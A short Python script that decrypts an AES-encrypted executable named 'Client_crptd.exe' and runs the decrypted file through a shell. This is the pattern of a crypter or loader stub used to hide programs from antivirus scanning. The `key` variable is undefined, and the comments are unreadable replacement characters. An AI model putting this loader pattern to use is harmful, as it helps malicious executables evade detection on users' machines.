import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_file(input_file, output_file, key):
    # ������ ������������� ������
    with open(input_file, 'rb') as f:
        iv = f.read(AES.block_size)
        encrypted_data = f.read()

    # ���������� ������
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    # ������ �������������� ������ � �������� ����
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)

def run_decrypted_program(file_path):
    # ������ �������������� ���������
    subprocess.run(file_path, shell=True)

# ������ �������������
decrypt_file('Client_crptd.exe', 'Client.exe', key)
run_decrypted_program('Client.exe')
